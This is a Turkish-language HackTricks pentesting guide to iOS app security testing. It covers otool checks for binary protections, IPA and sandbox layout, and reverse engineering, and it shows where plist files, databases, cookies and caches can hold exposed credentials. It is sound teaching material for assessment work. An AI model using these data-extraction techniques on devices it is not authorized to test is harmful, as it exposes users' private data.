# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
* Özel [**NFT'ler**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek **hacking hilelerinizi paylaşın**.

</details>

## iOS Temelleri

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Test Ortamı

Bu sayfada **iOS simülatörü**, **emülatörler** ve **jailbreak** hakkında bilgi bulabilirsiniz:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## İlk Analiz

### Temel iOS Test İşlemleri

Test sırasında **birkaç işlem önerilecek** (cihaza bağlanma, dosya okuma/yazma/yükleme/indirme, bazı araçları kullanma...). Bu nedenle, bu işlemlerin nasıl gerçekleştirileceğini bilmiyorsanız, lütfen **sayfayı okumaya başlayın**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Aşağıdaki adımlar için **uygulama cihaza yüklenmiş olmalı** ve uygulamanın **IPA dosyası** zaten alınmış olmalıdır.\
Bunu nasıl yapacağınızı öğrenmek için [Temel iOS Test İşlemleri](basic-ios-testing-operations.md) sayfasını okuyun.
{% endhint %}

### Temel Statik Analiz

IPA dosyasına otomatik bir Statik Analiz yapmak için [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) aracını kullanmanız önerilir.

Binary'de bulunan **korumaların tanımlanması**:

*   **PIE (Position Independent Executable)**: Etkinleştirildiğinde, uygulama her başlatıldığında rastgele bir bellek adresine yüklenir, bu da başlangıç bellek adresini tahmin etmeyi zorlaştırır.

```bash
otool -hv <app-binary> | grep PIE   # PIE bayrağını içermesi gerekiyor
```
*   **Stack Canaries**: Yığının bütünlüğünü doğrulamak için, bir işlevi çağırmadan önce yığında bir 'canary' değeri yerleştirilir ve işlev sona erdikten sonra tekrar doğrulanır.

```bash
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guard ve stack_chk_fail sembollerini içermesi gerekiyor
```
*   **ARC (Automatic Reference Counting)**: Ortak bellek bozulma hatalarını önlemek için

```bash
otool -I -v <app-binary> | grep objc_release   # _objc_release sembolünü içermesi gerekiyor
```
*   **Şifrelenmiş Binary**: Binary şifrelenmiş olmalı

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 olmalı
```

**Hassas/Güvensiz Fonksiyonların Tanımlanması**

*   **Zayıf Hash Algoritmaları**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux'ta
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Güvensiz Rastgele Fonksiyonlar**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux'ta
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Güvensiz 'Malloc' Fonksiyonu**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_malloc"

# Linux'ta
grep -iER "_malloc"
```
*   **Güvensiz ve Savunmasız Fonksiyonlar**

```bash
# iOS cihazında
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux'ta
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Temel Dinamik Analiz

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) tarafından gerçekleştirilen dinamik analizi kontrol edin. Farklı görünümler arasında gezinmeniz ve etkileşimde bulunmanız gerekecek, ancak diğer işlemleri yaparken birçok sınıfa bağlanacak ve bir rapor hazırlayacaktır.

### Yüklenmiş Uygulamaların Listelenmesi

`frida-ps -Uai` komutunu kullanarak yüklenmiş uygulamaların **bundle kimliğini** belirleyin:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Temel Sıralama ve Hooking

Uygulamanın bileşenlerini **sıralamanın** ve yöntemleri ve sınıfları kolayca **hooking** yapmanın nasıl yapılacağını öğrenin:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA Yapısı

Bir **IPA dosyasının** yapısı temel olarak bir **sıkıştırılmış paketin** yapısıdır. Uzantısını `.zip` olarak yeniden adlandırarak, içeriğini ortaya çıkarmak için **sıkıştırılabilir**. Bu yapı içinde, bir **Paket** uygulamanın kaynaklarını kapsayan tamamen paketlenmiş bir uygulamayı temsil eder.

* **`Info.plist`**: Bu dosya, uygulamanın belirli yapılandırma ayrıntılarını içerir.
* **`_CodeSignature/`**: Bu dizin, paketteki tüm dosyaların bütünlüğünü sağlayan bir imza içeren bir plist dosyasını içerir.
* **`Assets.car`**: İkonlar gibi varlık dosyalarını depolayan sıkıştırılmış bir arşiv.
* **`Frameworks/`**: Bu klasör, uygulamanın `.dylib` veya `.framework` dosyaları şeklinde olabilen yerel kitaplıklarını barındırır.
* **`PlugIns/`**: Bu, uygulamaya eklenti olarak adlandırılan `.appex` dosyalarını içerebilir, ancak her zaman mevcut değildir.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Çevrimdışı kullanım için uygulamanızın kalıcı verilerini kaydetmek, geçici verileri önbelleğe almak ve uygulamanıza tek bir cihazda geri alma işlevselliği eklemek için kullanılır. Bir iCloud hesabındaki birden çok cihaz arasında veri senkronizasyonu için Core Data, şemanızı otomatik olarak bir CloudKit konteynerine yansıtır.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` dosyası, uygulamanızın veya paketinizin türünü ve oluşturucu kodlarını belirtmenin alternatif bir yoludur.
* **en.lproj, fr.proj, Base.lproj**: Bu, belirli diller için kaynakları içeren dil paketlerini ve desteklenmeyen bir dil için varsayılan bir kaynağı içeren dil paketlerini içeren dil paketleridir.
* **Güvenlik**: `_CodeSignature/` dizini, dijital imzalar aracılığıyla tüm paketlenmiş dosyaların bütünlüğünü doğrulayarak uygulamanın güvenliğinde kritik bir rol oynar.
* **Varlık Yönetimi**: `Assets.car` dosyası, grafiksel varlıkları verimli bir şekilde yönetmek için sıkıştırmayı kullanır, bu da uygulama performansını optimize etmek ve genel boyutunu azaltmak için önemlidir.
* **Framework'ler ve Eklentiler**: Bu dizinler, iOS uygulamalarının modülerliğini vurgular, geliştiricilere yeniden kullanılabilir kod kitaplıklarını (`Frameworks/`) ve uygulama işlevselliğini genişletmelerini (`PlugIns/`) sağlar.
* **Yerelleştirme**: Yapı, birden çok dil için desteklenen kaynakları içererek küresel uygulama erişimini kolaylaştırır.

**Info.plist**

**Info.plist**, iOS uygulamaları için bir köşe taşı olarak hizmet eder ve **anahtar-değer** çiftleri şeklindeki önemli yapılandırma verilerini kapsar. Bu dosya, yalnızca uygulamalar için değil, aynı zamanda içinde paketlenmiş uygulama uzantıları ve çerçeveler için de gereklidir. XML veya ikili bir formatta yapılandırılmış olup, uygulama izinlerinden güvenlik yapılandırmalarına kadar önemli bilgileri içerir. Mevcut anahtarlar hakkında ayrıntılı bir keşif için, [**Apple Geliştirici Belgelerine**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc) başvurulabilir.

Bu dosya ile daha erişilebilir bir formatta çalışmak isteyenler için, XML dönüşümü macOS'ta `plutil` (sürüm 10.2 ve sonraki sürümlerde doğal olarak mevcut) veya Linux'ta `plistutil` kullanılarak kolayca gerçekleştirilebilir. Dönüşüm için kullanılan komutlar aşağıdaki gibidir:

- **macOS için**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Linux için**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** dosyasının ifşa edebileceği bilgiler arasında, dikkate değer girişler arasında uygulama izin dizeleri (`UsageDescription`), özel URL şemaları (`CFBundleURLTypes`) ve App Transport Security için yapılandırmalar (`NSAppTransportSecurity`) bulunur. Bu girişler, diğerleriyle birlikte (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`) dışa aktarılan / içe aktarılan özel belge türleri gibi, dosyanın incelenmesi veya basit bir `grep` komutu kullanılarak kolayca bulunabilir:
```bash
$ grep -i <keyword> Info.plist
```
**Veri Yolları**

iOS ortamında, dizinler özel olarak **sistem uygulamaları** ve **kullanıcı tarafından yüklenen uygulamalar** için ayrılmıştır. Sistem uygulamaları `/Applications` dizininde bulunurken, kullanıcı tarafından yüklenen uygulamalar `/private/var/containers/` altına yerleştirilir. Bu uygulamalara **128-bit UUID** olarak bilinen benzersiz bir tanımlayıcı atanır, bu nedenle dizin adlarının rastgele olması nedeniyle bir uygulamanın klasörünü manuel olarak bulmak zor olabilir.

Bir kullanıcı tarafından yüklenen uygulamanın kurulum dizinini keşfetmeyi kolaylaştırmak için **objection aracı**, `env` adlı kullanışlı bir komut sağlar. Bu komut, söz konusu uygulama için ayrıntılı dizin bilgilerini ortaya çıkarır. Aşağıda bu komutun nasıl kullanılacağına dair bir örnek verilmiştir:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatif olarak, uygulama adı `find` komutu kullanılarak `/private/var/containers` içinde aranabilir:
```bash
find /private/var/containers -name "Progname*"
```
`ps` ve `lsof` gibi komutlar, uygulamanın sürecini belirlemek ve açık dosyaları listelemek için kullanılabilir. Bu komutlar, uygulamanın etkin dizin yolları hakkında bilgi sağlar:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Paket dizini:**

* **AppName.app**
* Bu, IPA'da daha önce görüldüğü gibi Uygulama Paketi'dir ve temel uygulama verilerini, statik içeriği ve uygulamanın derlenmiş ikili dosyasını içerir.
* Bu dizin kullanıcılara görünür, ancak **kullanıcılar buraya yazamaz**.
* Bu dizindeki içerik **yedeklenmez**.
* Bu klasörün içeriği, kod imzasını **doğrulamak** için kullanılır.

**Veri dizini:**

* **Documents/**
* Kullanıcı tarafından oluşturulan tüm verileri içerir. Uygulama son kullanıcısı bu verilerin oluşturulmasını başlatır.
* Kullanıcılara görünür ve **kullanıcılar buraya yazabilir**.
* Bu dizindeki içerik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yolları devre dışı bırakabilir.
* **Library/**
* Kullanıcıya özgü olmayan tüm dosyaları içerir, örneğin önbellekler, tercihler, çerezler ve özellik listesi (plist) yapılandırma dosyaları.
* iOS uygulamaları genellikle `Application Support` ve `Caches` alt dizinlerini kullanır, ancak uygulama özel alt dizinler oluşturabilir.
* **Library/Caches/**
* Yarı kalıcı önbelleğe alınmış dosyaları içerir.
* Kullanıcılara görünmez ve **kullanıcılar buraya yazamaz**.
* Bu dizindeki içerik **yedeklenmez**.
* Uygulama çalışmıyorken ve depolama alanı azaldığında işletim sistemi bu dizinin dosyalarını otomatik olarak silebilir.
* **Library/Application Support/**
* Uygulamanın çalışması için gerekli olan **kalıcı dosyaları** içerir.
* Kullanıcılara **görünmez** ve kullanıcılar buraya yazamaz.
* Bu dizindeki içerik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yolları devre dışı bırakabilir.
* **Library/Preferences/**
* Bir uygulama yeniden başlatıldıktan sonra bile **kalıcı olarak saklanabilen** özellikleri depolamak için kullanılır.
* Bilgiler, şifrelenmemiş olarak, uygulama sandbox'ının içinde \[BUNDLE\_ID].plist adlı bir plist dosyasında kaydedilir.
* `NSUserDefaults` kullanılarak depolanan tüm anahtar/değer çiftleri bu dosyada bulunabilir.
* **tmp/**
* Uygulama başlatmaları arasında kalıcı olması gerekmeyen **geçici dosyaları** yazmak için bu dizini kullanın.
* Kalıcı olmayan önbelleğe alınmış dosyaları içerir.
* Kullanıcılara **görünmez**.
* Bu dizindeki içerik yedeklenmez.
* Uygulama çalışmıyorken ve depolama alanı azaldığında işletim sistemi bu dizinin dosyalarını otomatik olarak silebilir.

İGoat-Swift'in Paket Dizini (.app) dizinine, Bundle dizini içindeki (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) bir göz atalım:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Tersine Mühendislik

`<application-name>.app` klasörü içinde `<application-name>` adında bir ikili dosya bulacaksınız. Bu dosya **çalıştırılacak** olan dosyadır. İkili dosyanın temel bir incelemesini **`otool`** aracıyla yapabilirsiniz:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Uygulama şifreli mi kontrol edin**

Aşağıdaki komutu kullanarak herhangi bir çıktı olup olmadığını kontrol edin:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Binary dosyasının disassembling işlemi**

Metin bölümünü disassemble edin:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Örnek uygulamanın **Objective-C segmentini** yazdırmak için şunu kullanabilirsiniz:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Daha kompakt bir Objective-C kod elde etmek için [**class-dump**](http://stevenygard.com/projects/class-dump/) kullanabilirsiniz:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ancak, ikili dosyayı parçalamak için en iyi seçenekler: [**Hopper**](https://www.hopperapp.com/download.html?) ve [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Veri Depolama

iOS'un cihazda veri depolama şekli hakkında bilgi edinmek için bu sayfayı okuyun:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Bilgilerin depolanabileceği aşağıdaki yerler, uygulama **kurulduktan hemen sonra**, uygulamanın **tüm işlevlerini kontrol ettikten sonra** ve hatta **bir kullanıcıdan çıkış yapıp başka bir kullanıcıya giriş yaptıktan sonra** kontrol edilmelidir.\
Amaç, uygulamanın (şifreler, tokenlar), mevcut kullanıcının ve önceki oturum açmış kullanıcıların **korumasız hassas bilgilerini** bulmaktır.
{% endhint %}

### Plist

**plist** dosyaları, **anahtar-değer çiftlerini içeren** yapılandırılmış XML dosyalarıdır. Bu dosyalarda bazen **hassas bilgiler bulabilirsiniz**. Yeni veri yazılıp yazılmadığını görmek için uygulamayı kurduktan ve yoğun bir şekilde kullandıktan sonra bu dosyaları kontrol etmek önerilir.

Plist dosyalarında verileri kalıcı olarak depolamanın en yaygın yolu **NSUserDefaults** kullanmaktır. Bu plist dosyası, **`Library/Preferences/<appBundleID>.plist`** dizininde uygulama sandbox'ının içinde kaydedilir.

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) sınıfı, varsayılan sistemle etkileşimde bulunmak için programatik bir arayüz sağlar. Varsayılan sistem, bir uygulamanın **kullanıcı tercihlerine** göre davranışını özelleştirmesine izin verir. `NSUserDefaults` tarafından kaydedilen veriler uygulama paketi içinde görüntülenebilir. Bu sınıf, verileri bir plist dosyasında saklar, ancak küçük miktarda veriyle kullanılması amaçlanmıştır.

Bu verilere doğrudan güvenilir bir bilgisayar üzerinden erişilemez, ancak bir **yedekleme** yaparak erişilebilir.

`NSUserDefaults` kullanarak kaydedilen bilgileri objection'ın `ios nsuserdefaults get` komutunu kullanarak **dökümleyebilirsiniz**.

Uygulama tarafından kullanılan tüm plist dosyalarını bulmak için `/private/var/mobile/Containers/Data/Application/{APPID}` dizinine erişebilir ve aşağıdaki komutu çalıştırabilirsiniz:
```bash
find ./ -name "*.plist"
```
**XML veya ikili (bplist)** formatındaki dosyaları XML'e dönüştürmek için, işletim sisteminize bağlı olarak çeşitli yöntemler mevcuttur:

**MacOS Kullanıcıları İçin:**
`plutil` komutunu kullanın. Bu, macOS (10.2+) için yerleşik bir araçtır ve bu amaçla tasarlanmıştır:
```bash
$ plutil -convert xml1 Info.plist
```
**Linux Kullanıcıları İçin:**
Öncelikle `libplist-utils`'u yükleyin, ardından dosyanızı dönüştürmek için `plistutil` kullanın:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Bir Objection Oturumu İçinde:**
Mobil uygulamaları analiz etmek için, plist dosyalarını doğrudan dönüştürmenizi sağlayan özel bir komut bulunmaktadır:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1), uygulamanızın model katmanını yönetmek için bir çerçevedir. Core Data, kalıcı depolama olarak SQLite'yi kullanabilir, ancak çerçeve kendisi bir veritabanı değildir.\
CoreData, varsayılan olarak verilerini şifrelemez. Bununla birlikte, CoreData'ye ek bir şifreleme katmanı ekleyebilirsiniz. Daha fazla ayrıntı için [GitHub Repo](https://github.com/project-imas/encrypted-core-data)'ya bakın.

Bir uygulamanın SQLite Core Data bilgilerini `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` yolunda bulabilirsiniz.

**Eğer SQLite'yi açabilir ve hassas bilgilere erişebilirseniz, bir yapılandırma hatası buldunuz demektir.**

{% code title="iGoat'tan Kod" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase), SQLite üzerine inşa edilmiş bir anahtar/değer deposudur.\
Yap veritabanları sqlite veritabanları olduğu için, önceki bölümde önerilen komutu kullanarak onları bulabilirsiniz.

### Diğer SQLite Veritabanları

Uygulamaların kendi sqlite veritabanlarını oluşturması yaygındır. Bu veritabanlarında **hassas** **veriler** saklanabilir ve şifrelenmeden bırakılabilir. Bu nedenle, her uygulama dizinindeki her veritabanını kontrol etmek her zaman ilginç olabilir. Bu nedenle, verilerin kaydedildiği uygulama dizinine gidin (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Gerçek Zamanlı Veritabanları

Geliştiricilere Firebase Gerçek Zamanlı Veritabanları aracılığıyla bir NoSQL bulut barındırılan veritabanında veri depolama ve senkronizasyonu imkanı sunulmaktadır. Veri JSON formatında depolanır ve gerçek zamanlı olarak tüm bağlı istemcilere senkronize edilir.

Firebase veritabanlarının yanlış yapılandırılmış olup olmadığını nasıl kontrol edeceğinizi burada bulabilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm veritabanları

[Realm Objective-C](https://realm.io/docs/objc/latest/) ve [Realm Swift](https://realm.io/docs/swift/latest/) Apple tarafından sağlanmayan güçlü bir veri depolama alternatifi sunar. Varsayılan olarak, veriler şifrelenmemiş olarak depolanır ve şifreleme belirli yapılandırmalar aracılığıyla sağlanır.

Veritabanları `/private/var/mobile/Containers/Data/Application/{APPID}` konumunda bulunur. Bu dosyaları keşfetmek için aşağıdaki gibi komutlar kullanılabilir:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Bu veritabanı dosyalarını görüntülemek için [**Realm Studio**](https://github.com/realm/realm-studio) aracı önerilir.

Bir Realm veritabanı içinde şifreleme uygulamak için aşağıdaki kod parçacığı kullanılabilir:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite Veritabanları

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios), **hafif** ve **yerleşik** bir veritabanı motoru olarak tanımlanır ve **belge odaklı** (NoSQL) yaklaşımı izler. **iOS** ve **macOS** için yerel olarak tasarlanmış olup, verilerin sorunsuz bir şekilde senkronize edilmesini sağlar.

Bir cihazda potansiyel Couchbase veritabanlarını belirlemek için aşağıdaki dizin incelenmelidir:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Çerezler

iOS, uygulamaların çerezlerini her uygulamanın klasörü içindeki **`Library/Cookies/cookies.binarycookies`** dosyasında saklar. Bununla birlikte, geliştiriciler bazen bu çerezleri **anahtarlıkta** saklamayı tercih eder, çünkü bahsi geçen **çerez dosyasına yedeklerden erişilebilir**.

Çerez dosyasını incelemek için [**bu python betiğini**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) kullanabilir veya objection'ın **`ios cookies get`** komutunu kullanabilirsiniz.\
Bu dosyaları JSON formatına dönüştürmek ve verileri incelemek için objection'ı da kullanabilirsiniz.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Önbellek

NSURLSession varsayılan olarak **HTTP isteklerini ve yanıtlarını Cache.db veritabanında** saklar. Bu veritabanı, eğer tokenlar, kullanıcı adları veya başka hassas bilgiler önbelleğe alındıysa, **hassas verileri** içerebilir. Önbelleğe alınmış bilgileri bulmak için uygulamanın veri dizinini (`/var/mobile/Containers/Data/Application/<UUID>`) açın ve `/Library/Caches/<Bundle Identifier>` dizinine gidin. **WebKit önbelleği de Cache.db dosyasında saklanır**. **Objection**, bu veritabanını `sqlite connect Cache.db` komutuyla açabilir ve etkileşimde bulunabilir, çünkü bu normal bir SQLite veritabanıdır.

İstek veya yanıtta hassas bilgiler bulunabileceğinden, bu verilerin **önbelleğe alınmaması önerilir**. Aşağıdaki liste, bunu başarmanın farklı yollarını göstermektedir:

1. Oturum kapatıldıktan sonra önbelleğe alınmış yanıtların kaldırılması önerilir. Apple tarafından sağlanan [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) adlı yöntemle bunu yapabilirsiniz. Bu yöntemi aşağıdaki gibi çağırabilirsiniz:

   `URLCache.shared.removeAllCachedResponses()`

   Bu yöntem, Cache.db dosyasındaki tüm önbelleğe alınmış istekleri ve yanıtları kaldıracaktır.
2. Çerezlerin avantajını kullanmanız gerekmiyorsa, URLSession'ın [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) yapılandırma özelliğini kullanmanız önerilir. Bu, çerezleri ve önbelleği kaydetmeyi devre dışı bırakacaktır.

   [Apple belgeleri](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

   `Bir geçici oturum yapılandırma nesnesi, varsayılan bir oturum yapılandırmasıyla (bkz. default) benzerdir, ancak karşılık gelen oturum nesnesi önbellekleri, kimlik bilgisi depolarını veya herhangi bir oturumla ilgili veriyi diske kaydetmez. Bunun yerine, oturumla ilgili veriler RAM'de saklanır. Bir geçici oturumun veri yazdığı tek zaman, bir URL'nin içeriğini bir dosyaya yazmasını söylediğiniz zamandır.`
3. Önbellek, [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) önbellek politikasına ayarlanarak da devre dışı bırakılabilir. Bu, önbelleğin bellekte veya diske herhangi bir şekilde saklanmasını devre dışı bırakacaktır.

### Ekran Görüntüleri

Ana ekran düğmesine bastığınızda, iOS, uygulamaya çok daha yumuşak bir şekilde geçiş yapabilmek için mevcut ekranın bir görüntüsünü alır. Ancak, mevcut ekranda **hassas veriler** bulunuyorsa, bu veriler **resimde kaydedilir** (ki bu **yeniden başlatmalara kadar** **saklanır**). Bu, uygulamalar arasında geçiş yapmak için ana ekranı çift tıkladığınızda erişebileceğiniz ekran görüntüleridir.

